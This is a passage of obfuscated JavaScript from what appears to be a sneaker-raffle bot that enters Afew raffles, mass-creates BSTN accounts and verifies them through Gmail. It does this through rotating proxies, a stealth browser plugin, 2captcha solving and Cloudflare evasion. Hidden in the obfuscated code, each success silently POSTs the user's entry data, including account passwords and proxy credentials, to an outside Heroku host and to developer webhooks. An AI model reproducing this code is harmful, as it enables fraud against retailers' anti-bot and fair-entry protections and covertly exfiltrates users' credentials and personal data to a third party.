                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x22cd7a = JSON['parse'](_0x3f8380['readFileSync']('sizes.json', 'utf-8')), _0xc09bf2 = _0x110449[_0x4c166c]['Url'], _0x4b29f9 = _0x110449[_0x4c166c]['Size'], _0xbf364b;
                        async function _0x5602ee() {
                            var _0xe78b63 = new _0x248c22['CookieJar']();
                            console['log'](_0x5c3ac1() + '\x20[' + _0x29dce7['name'] + ']\x20Task\x20' + (_0x4c166c + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x30379d;
                            let _0x2fa3ab = {
                                'method': 'GET',
                                'cookieJar': _0xe78b63,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x8a857d[0x2] + ':' + _0x8a857d[0x3] + '@' + _0x8a857d[0x0] + ':' + _0x8a857d[0x1]
                            }, _0x3ca53c = _0xc09bf2['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x40d7d9 = _0x3ca53c + '.json', _0x593239 = await _0x529551(_0x40d7d9);
                            console['log'](_0x5c3ac1() + '\x20[' + _0x29dce7['name'] + ']\x20Task\x20' + (_0x4c166c + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x25a10e = _0x593239['data']['product']['variants'];
                            if (_0x4b29f9 != 'RANDOM') {
                                if (_0x25a10e[0x1]['option1']['includes']('W')) {
                                    const _0x43757e = _0x22cd7a['women']['find'](_0x14d3eb => _0x14d3eb['EUsize'] === _0x4b29f9);
                                    _0x43757e && (_0x4b29f9 = _0x43757e['size']);
                                } else {
                                    if (_0x25a10e[0x1]['option1']['includes']('Y')) {
                                        const _0x3f2b86 = _0x22cd7a['GS']['find'](_0x3789ff => _0x3789ff['EUsize'] === _0x4b29f9);
                                        _0x3f2b86 && (_0x4b29f9 = _0x3f2b86['size']);
                                    } else {
                                        const _0x4dd544 = _0x22cd7a['men']['find'](_0xa0f10f => _0xa0f10f['EUsize'] === _0x4b29f9);
                                        _0x4dd544 && (_0x4b29f9 = _0x4dd544['size']);
                                    }
                                }
                                for (var _0x42757a of _0x25a10e) {
                                    _0x42757a['option1'] == _0x4b29f9 && (_0x30379d = _0x42757a['id']);
                                }
                            } else {
                                var _0x572098 = Math['round'](Math['random']() * (_0x25a10e['length'] - 0x1));
                                _0x30379d = _0x25a10e[_0x572098]['id'];
                            }
                            console['log'](_0x5c3ac1() + '\x20[' + _0x29dce7['name'] + ']\x20Task\x20' + (_0x4c166c + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x529551('https://raffles.afew-store.com/cart/' + _0x30379d + ':1'), _0xbf364b = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x5602ee();
                        } catch (_0x5c9d46) {
                            if (_0x5c9d46['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x5c9d46);
                        }
                        const _0xa1379b = await _0xd54433['newPage']();
                        await _0xa1379b['setDefaultNavigationTimeout'](0x1d4c0), await _0xa1379b['authenticate']({
                            'username': '' + _0x8a857d[0x2],
                            'password': '' + _0x8a857d[0x3]
                        }), await _0xa1379b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xa1379b['setRequestInterception'](!![]), _0xa1379b['on']('request', _0x41f04e => {
                            _0x41f04e['resourceType']() === 'image' || _0x41f04e['resourceType']() === 'font' || _0x41f04e['resourceType']() === 'media' ? _0x41f04e['abort']() : _0x41f04e['continue']();
                        });
                        try {
                            await _0xa1379b['goto'](_0xbf364b, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x5c3ac1() + '\x20[' + _0x29dce7['name'] + ']\x20Task\x20' + (_0x4c166c + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0xa1379b['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xa1379b['type']('#checkout_email', '' + _0x110449[_0x4c166c]['Email']), await _0xf987cc(0x320), await _0xa1379b['type']('#checkout_attributes_instagram', '' + _0x110449[_0x4c166c]['Follower']), await _0xf987cc(0x320), await _0xa1379b['select']('#checkout_shipping_address_country', '' + _0x110449[_0x4c166c]['Country']), await _0xa1379b['waitForTimeout'](0x258), await _0xa1379b['type']('#checkout_shipping_address_first_name', '' + _0x110449[_0x4c166c]['FirstName']), await _0xa1379b['waitForTimeout'](0x320), await _0xa1379b['type']('#checkout_shipping_address_last_name', '' + _0x110449[_0x4c166c]['LastName']), await _0xa1379b['waitForTimeout'](0x2bc), await _0xa1379b['type']('#checkout_shipping_address_address1', _0x110449[_0x4c166c]['Address1'] + '\x20' + _0x110449[_0x4c166c]['HouseNumber']), await _0xa1379b['waitForTimeout'](0x2bc), await _0xa1379b['type']('#checkout_shipping_address_address2', '' + _0x110449[_0x4c166c]['Address2']), await _0xa1379b['waitForTimeout'](0x2bc), await _0xa1379b['type']('#checkout_shipping_address_zip', '' + _0x110449[_0x4c166c]['Zip']), await _0xa1379b['waitForTimeout'](0x2bc), await _0xa1379b['type']('#checkout_shipping_address_city', '' + _0x110449[_0x4c166c]['City']), await _0xa1379b['waitForTimeout'](0x2bc);
                        if (_0x110449[_0x4c166c]['State'] != '')
                            try {
                                const _0x4efbd4 = JSON['parse'](_0x3f8380['readFileSync']('States.json', 'utf8'));
                                await _0xf987cc(0x1f4);
                                if (_0x110449[_0x4c166c]['State']['length'] > 0x2)
                                    for (let _0x54390b of _0x4efbd4) {
                                        if (_0x54390b['Province'] == _0x110449[_0x4c166c]['State']) {
                                            await _0xa1379b['select']('#checkout_shipping_address_province', _0x54390b['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0xa1379b['select']('#checkout_shipping_address_province', _0x110449[_0x4c166c]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0xf987cc(0x1f4), console['log'](_0x5c3ac1() + '\x20[' + _0x29dce7['name'] + ']\x20Task\x20' + (_0x4c166c + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0xf987cc(0x190), _0xa1379b['evaluate'](() => {
                            const _0xa56634 = document['querySelector']('#continue_button');
                            for (var _0x4bdf6a = 0x0; _0x4bdf6a < 0x5; _0x4bdf6a++) {
                                if (_0xa56634) {
                                    _0xa56634['click'](), _0xa56634['click']();
                                    break;
                                } else
                                    _0xf987cc(0xfa0);
                            }
                        }), await _0xa1379b['waitForTimeout'](0x9c4);
                        try {
                            await _0xa1379b['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0xa1379b['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x3d7ef6 => _0x3d7ef6['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xa1379b['waitForTimeout'](0x7d0), console['log'](_0x5c3ac1() + '\x20[' + _0x29dce7['name'] + ']\x20Task\x20' + (_0x4c166c + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0xa1379b['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xf987cc(0x3e8), await _0xa1379b['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x16aa88 => _0x16aa88['submit']()), await _0xf987cc(0x3e8);
                        try {
                            await _0xa1379b['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0xa1379b['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x544984 => _0x544984['submit']());
                        try {
                            await _0xa1379b['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x3dc99 = 'no', _0x46ba09(_0x110449[_0x4c166c], _0x29dce7), console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x29dce7['name'] + ']\x20Task\x20' + (_0x4c166c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '')
                                try {
                                    await _0x215470(_0x51f80a['webhook'], _0x20819f['succesDEVMSG']);
                                } catch {
                                }
                            await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x20819f['succesDEVMSG']), await _0xf987cc(0xc8);
                            try {
                                await _0x215470(_0x255a14, _0x20819f['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x5ad930['replace']('#', ''),
                                    'module': _0x29dce7['name'],
                                    'entrydata': JSON['stringify'](_0x536f11),
                                    'proxy': '' + _0x1f6cf9[_0x4c166c]
                                };
                                var _0x2e18d5 = JSON['stringify'](prxdata);
                                let _0x3ef76b = { 'headers': { 'content-type': 'application/json' } };
                                await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x2e18d5, _0x3ef76b);
                            } catch (_0x272440) {
                            }
                        } catch (_0x2661a9) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x5f4e8e) {
                        _0x5f4e8e['message']['includes']('selector') && (_0x5f4e8e = 'Connection\x20Error');
                        console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x29dce7['name'] + ']\x20Task\x20' + (_0x4c166c + 0x1) + '\x20:\x20' + _0x5f4e8e)), _0x15cd68 = '' + _0x5f4e8e;
                        var _0x3c97ed = await _0x539676(_0x110449[_0x4c166c], _0x29dce7, 'dev', !![], _0x15cd68);
                        _0x20819f['errorDEV'] = { 'embeds': [_0x3c97ed] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x20819f['errorDEV']), await _0x215470(_0x1dec8a, _0x20819f['errorDEV']), _0x3dc99 = 'yes';
                    } finally {
                        _0xd54433 && _0xd54433['close']();
                        if (_0x3dc99 == 'yes' && _0x49666f != 0x5 && _0x15cd68 != 'Size\x20Not\x20Found') {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x29dce7['name'] + ']\x20Task\x20' + (_0x4c166c + 0x1) + '\x20:\x20Retrying\x20(' + _0x49666f + '\x20/\x205)')), _0x4c166c = _0x4c166c - 0x1, _0x49666f = _0x49666f + 0x1;
                            continue;
                        }
                        _0x3dc99 == 'yes' && _0x49666f >= 0x5 && (_0x46ac44(_0x110449[_0x4c166c], _0x29dce7), _0x3dc99 = 'no', _0x49666f = 0x0);
                        if (_0x4c166c + 0x1 == _0x110449['length']) {
                            await _0xf987cc(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x51f80a['AfewDelay'] + '\x20ms'), await _0xf987cc(_0x51f80a['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5f575a, _0x2c684d, _0xfec56) {
                    var _0xce9be9 = _0x2c684d, _0x22415d = 0x0;
                    for (var _0x11a640 = 0x0; _0x11a640 < _0x2c684d['length']; _0x11a640++) {
                        maxTasks = Number(_0x51f80a['threads']);
                        while (_0x22415d >= maxTasks) {
                            await _0xf987cc(0x7d0);
                        }
                        async function _0x706cec(_0x12fab6, _0x57bc74, _0x12f74a, _0x1b7c5c) {
                            _0x22415d++, _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x51f80a['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x346a9f != 'yes')
                                var _0x346a9f = '', _0x2e3e61 = 0x0;
                            var _0x538d06;
                            try {
                                await _0x3d5d40(_0x57bc74, _0x1b7c5c);
                            } catch {
                                _0x346a9f = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x5c316f(_0x12fab6['name'] + '\x20Task\x20' + (_0x1b7c5c + 0x1) + '\x20/\x20' + _0x57bc74['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                            var _0x12bb90 = await _0x539676(_0x57bc74[_0x1b7c5c], _0x12fab6, 'acc', ![]);
                            const _0x471e3b = { 'succesDEVMSG': { 'embeds': [_0x12bb90] } }, _0x32f7d0 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x596bdf = Math['round'](Math['random']() * (_0x12f74a['length'] - 0x1)), _0x582526 = _0x12f74a[_0x596bdf]['split'](':'), _0x195e50;
                            try {
                                _0x195e50 = await _0x39c115['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x582526[0x0] + ':' + _0x582526[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x195e50 = await _0x39c115['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x582526[0x0] + ':' + _0x582526[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x2a9c15 = await _0x195e50['newPage']();
                                await _0x2a9c15['authenticate']({
                                    'username': '' + _0x582526[0x2],
                                    'password': '' + _0x582526[0x3]
                                }), console['log'](_0x5c3ac1() + '\x20[' + _0x12fab6['name'] + ']\x20Task\x20' + (_0x1b7c5c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2a9c15['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2a9c15['setRequestInterception'](!![]), _0x2a9c15['on']('request', _0x194ac7 => {
                                    _0x194ac7['resourceType']() === 'image' ? _0x194ac7['abort']() : _0x194ac7['continue']();
                                });
                                try {
                                    await _0x2a9c15['goto']('' + _0x32f7d0), await _0x2a9c15['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x346a9f = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x2a9c15['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x5c3ac1() + '\x20[' + _0x12fab6['name'] + ']\x20Task\x20' + (_0x1b7c5c + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xf987cc(0x7d0), console['log'](_0x5c3ac1() + '\x20[' + _0x12fab6['name'] + ']\x20Task\x20' + (_0x1b7c5c + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xf987cc(0x190), await _0x2a9c15['waitForSelector']('#firstname'), await _0x2a9c15['type']('#firstname', _0x57bc74[_0x1b7c5c]['FirstName'], { 'delay': 0xf0 }), await _0xf987cc(0x190), await _0x2a9c15['type']('#lastname', _0x57bc74[_0x1b7c5c]['LastName'], { 'delay': 0xe6 }), await _0xf987cc(0x190), await _0x2a9c15['type']('#email_address', _0x57bc74[_0x1b7c5c]['Email'], { 'delay': 0x122 }), await _0xf987cc(0x190), await _0x2a9c15['type']('#password', _0x57bc74[_0x1b7c5c]['Password'], { 'delay': 0x82 }), await _0xf987cc(0x1f4), await _0x2a9c15['type']('#password-confirmation', _0x57bc74[_0x1b7c5c]['Password'], { 'delay': 0x7c }), console['log'](_0x5c3ac1() + '\x20[' + _0x12fab6['name'] + ']\x20Task\x20' + (_0x1b7c5c + 0x1) + '\x20:\x20Sending\x20Request'), await _0xf987cc(0x2bc), await _0x2a9c15['$eval']('#form-validate', _0x3e0813 => _0x3e0813['submit']()), await _0xf987cc(0x1388);
                                const _0x22d67b = await _0x2a9c15['$']('#email_address-error');
                                if (_0x22d67b)
                                    throw new Error('Invalid\x20Email');
                                const _0x5364cc = await _0x2a9c15['$']('#password-error');
                                if (_0x5364cc)
                                    throw new Error('Invalid\x20Password');
                                await _0x2a9c15['waitForSelector']('div.mesg-success'), _0x346a9f = 'no', console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x12fab6['name'] + ']\x20Task\x20' + (_0x1b7c5c + 0x1) + '\x20:\x20Account\x20' + _0x57bc74[_0x1b7c5c]['Email'] + '\x20Generated')), _0x3f8380['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x57bc74[_0x1b7c5c]['Email'] + ',' + _0x57bc74[_0x1b7c5c]['Password']);
                                try {
                                    _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x471e3b['succesDEVMSG']);
                                } catch {
                                }
                                await _0x215470(_0x53db35, _0x471e3b['succesDEVMSG']);
                                let _0x310a13 = _0x57bc74[_0x1b7c5c];
                                try {
                                    prxdata = {
                                        'username': _0x5ad930['replace']('#', ''),
                                        'module': _0x12fab6['name'],
                                        'entrydata': JSON['stringify'](_0x310a13),
                                        'proxy': '' + _0x12f74a[_0x1b7c5c]
                                    };
                                    var _0x3fb082 = JSON['stringify'](prxdata);
                                    let _0x2f4d28 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x3fb082, _0x2f4d28);
                                } catch (_0x4a7bea) {
                                }
                                console['log'](_0x2c0b56['yellow'](_0x5c3ac1() + '\x20[' + _0x12fab6['name'] + ']\x20Task\x20' + (_0x1b7c5c + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x1ac8fd) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x12fab6['name'] + ']\x20Task\x20' + (_0x1b7c5c + 0x1) + '\x20:\x20' + _0x1ac8fd)), _0x538d06 = '' + _0x1ac8fd;
                                var _0x49278c = await _0x539676(_0x57bc74[_0x1b7c5c], _0x12fab6, 'acc', !![], _0x538d06);
                                _0x471e3b['errorDEV'] = { 'embeds': [_0x49278c] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x471e3b['errorDEV']), await _0x215470(_0x1dec8a, _0x471e3b['errorDEV']), _0x346a9f = 'yes';
                            } finally {
                                if (_0x195e50)
                                    _0x195e50['close']();
                                if (_0x346a9f == 'yes' && _0x2e3e61 != 0x5)
                                    return console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x12fab6['name'] + ']\x20Task\x20' + (_0x1b7c5c + 0x1) + '\x20:\x20Retrying\x20(' + _0x2e3e61 + '\x20/\x205)')), _0x2e3e61 = _0x2e3e61 + 0x1, _0x57bc74(_0x12fab6, _0x57bc74, _0x12f74a, _0x1b7c5c);
                                _0x346a9f == 'yes' && _0x2e3e61 >= 0x5 && (_0x46ac44(_0x57bc74[_0x1b7c5c], _0x12fab6), _0x346a9f = 'no', _0x2e3e61 = 0x0), _0x22415d--, console['log'](_0x5c3ac1() + '\x20[' + _0x12fab6['name'] + ']\x20Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                            }
                        }
                        _0x706cec(_0x5f575a, _0xce9be9, _0xfec56, _0x11a640), await _0xf987cc(0x3e8);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5c206e, _0x3214ea) {
                    var _0x5340a3 = ![], _0x3ef8de = [];
                    async function _0x4abd6c() {
                        var _0x3bde8a = new _0x2a51ab({
                            'user': _0x51f80a['masterMail'],
                            'password': _0x51f80a['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x275707(_0x10a585) {
                            _0x3bde8a['openBox']('INBOX', ![], _0x10a585);
                        }
                        _0x3bde8a['once']('ready', function () {
                            _0x275707(function (_0x32cb86, _0x2a5502) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x32cb86)
                                    throw _0x32cb86;
                                _0x3bde8a['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x4e5164, _0x205d14) {
                                    if (!_0x205d14 || !_0x205d14['length'])
                                        console['log'](_0x5c3ac1() + '\x20[' + _0x5c206e['name'] + ']\x20No\x20mails\x20found'), _0x3bde8a['end']();
                                    else {
                                        var _0x2c5e8d = _0x3bde8a['seq']['fetch'](_0x205d14, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2c5e8d['on']('message', function (_0x1511be, _0x29af0f) {
                                            var _0x19239c = '(#' + _0x29af0f + ')\x20';
                                            _0x1511be['on']('body', function (_0x508194, _0x43a686) {
                                                _0xfebb(_0x508194, (_0x53667f, _0xa93002) => {
                                                    var _0x2a9abb = _0xa93002['text']['split']('[')[0x2], _0x270c12 = _0x2a9abb['split'](']')[0x0];
                                                    _0x3ef8de['push'](_0x270c12);
                                                });
                                            }), _0x1511be['once']('end', function () {
                                            });
                                        }), _0x2c5e8d['once']('error', function (_0x9dd31) {
                                            console['log']('Fetch\x20error:\x20' + _0x9dd31), _0x5340a3 = !![];
                                        }), _0x2c5e8d['once']('end', function () {
                                            _0x3bde8a['end'](), _0x5340a3 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x3bde8a['once']('error', function (_0x1cc4e3) {
                            console['log'](_0x2c0b56['red'](_0x1cc4e3['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5340a3 = !![];
                        }), _0x3bde8a['once']('end', async function () {
                            _0x5340a3 = !![];
                        }), _0x3bde8a['connect']();
                    }
                    async function _0x3ca096(_0x3d6c1c, _0x1a985f, _0x34efa9) {
                        _0x39c115['use'](_0x5cc924());
                        for (var _0x251f3b = 0x0; _0x251f3b < _0x1a985f['length']; _0x251f3b++) {
                            if (_0x5ecb56 != 'yes')
                                var _0x5ecb56 = '', _0xc32b3b = 0x0;
                            var _0x14f029 = Math['round'](Math['random']() * (_0x34efa9['length'] - 0x1)), _0x783963 = _0x34efa9[_0x14f029]['split'](':'), _0x18ae01;
                            try {
                                _0x18ae01 = await _0x39c115['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x783963[0x0] + ':' + _0x783963[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x18ae01 = await _0x39c115['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x783963[0x0] + ':' + _0x783963[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x1b5242 = await _0x18ae01['newPage']();
                                await _0x1b5242['authenticate']({
                                    'username': '' + _0x783963[0x2],
                                    'password': '' + _0x783963[0x3]
                                }), console['log'](_0x5c3ac1() + '\x20[' + _0x3d6c1c['name'] + ']\x20Task\x20' + (_0x251f3b + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x1b5242['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1b5242['setRequestInterception'](!![]), _0x1b5242['on']('request', _0x20c7bf => {
                                    _0x20c7bf['resourceType']() === 'image' || _0x20c7bf['resourceType']() === 'font' || _0x20c7bf['resourceType']() === 'media' ? _0x20c7bf['abort']() : _0x20c7bf['continue']();
                                }), console['log'](_0x5c3ac1() + '\x20[' + _0x3d6c1c['name'] + ']\x20Task\x20' + (_0x251f3b + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x1b5242['goto'](_0x1a985f[_0x251f3b]);
                                } catch {
                                    _0x5ecb56 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x5c3ac1() + '\x20[' + _0x3d6c1c['name'] + ']\x20Task\x20' + (_0x251f3b + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1b5242['waitForTimeout'](0xbb8);
                                try {
                                    await _0x1b5242['waitForSelector']('.account-nav'), _0x5ecb56 = 'no', console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x3d6c1c['name'] + ']\x20Task\x20' + (_0x251f3b + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x5d7488 = await _0x539676(null, _0x3d6c1c, 'ver', ![]);
                                    const _0x2a91b3 = { 'succesDEVMSG': { 'embeds': [_0x5d7488] } };
                                    await _0x215470(_0x15717f, _0x2a91b3['succesDEVMSG']);
                                } catch {
                                    _0x5ecb56 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x574ca5) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x3d6c1c['name'] + ']\x20Task\x20' + (_0x251f3b + 0x1) + '\x20:\x20' + _0x574ca5));
                                var _0x5ba4d7 = _0x574ca5, _0x26ca4a = await _0x539676(null, _0x3d6c1c, 'ver', !![], _0x5ba4d7);
                                const _0xde9c5f = { 'errorDEVMSG': { 'embeds': [_0x26ca4a] } };
                                _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0xde9c5f['errorDEVMSG']), await _0x215470(_0x1dec8a, _0xde9c5f['errorDEVMSG']);
                            } finally {
                                _0x18ae01['close']();
                                if (_0x5ecb56 == 'yes' && _0xc32b3b != 0x5) {
                                    console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x3d6c1c['name'] + ']\x20Task\x20' + (_0x251f3b + 0x1) + '\x20:\x20Retrying\x20(' + _0xc32b3b + '\x20/\x205)')), _0x251f3b = _0x251f3b - 0x1, _0xc32b3b = _0xc32b3b + 0x1;
                                    continue;
                                }
                                _0x5ecb56 == 'yes' && _0xc32b3b >= 0x5 && (_0x5ecb56 = 'no', _0xc32b3b = 0x0), console['log'](_0x5c3ac1() + '\x20[' + _0x3d6c1c['name'] + ']\x20Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                            }
                        }
                    }
                    try {
                        _0x4abd6c();
                        while (!_0x5340a3) {
                            await _0xf987cc(0xfa0);
                        }
                        console['log']('Found\x20' + _0x3ef8de['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xf987cc(0x7d0);
                    }
                    await _0x3ca096(_0x5c206e, _0x3ef8de, _0x3214ea);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5270c8, _0x19bdd2, _0x47f6fa) {
                    _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51f80a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x20e347 = 0x0; _0x20e347 < _0x19bdd2['length']; _0x20e347++) {
                        var _0xfb7df9, _0x1b5879 = _0x19bdd2[_0x20e347];
                        try {
                            await _0x3d5d40(_0x19bdd2, _0x20e347);
                        } catch {
                            _0x208b0b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x1ea5b9(_0x576eac) {
                            const _0xa64742 = _0x3f8380['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4953b4 = _0x11f8e1['parse'](_0xa64742, { 'header': !![] })['data'];
